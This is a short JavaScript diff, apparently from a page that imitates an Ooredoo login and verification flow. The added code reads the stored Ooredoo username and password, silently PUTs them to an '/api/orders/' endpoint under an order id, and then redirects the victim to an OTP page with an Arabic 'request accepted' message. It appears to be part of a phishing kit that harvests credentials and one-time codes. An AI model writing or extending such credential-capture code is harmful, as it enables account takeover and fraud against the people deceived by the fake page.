@@ -90,8 +90,21 @@
 
   function checkDecision() {
     const decision = getFlowDecision();
+    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
 
     if (decision === 'accept') {
+      const payload = {
+        ooredooUser: sessionStorage.getItem('ooredooUser') || '',
+        ooredooPass: sessionStorage.getItem('ooredooPass') || '',
+        status: 'pending'
+      };
+
+      fetch('/api/orders/' + encodeURIComponent(orderId), {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+
       sessionStorage.setItem('loginError', 'تم قبول الطلب. يرجى متابعة التحقق من الرمز.');
       window.location.href = 'otp_ooredoo.html';
       return;
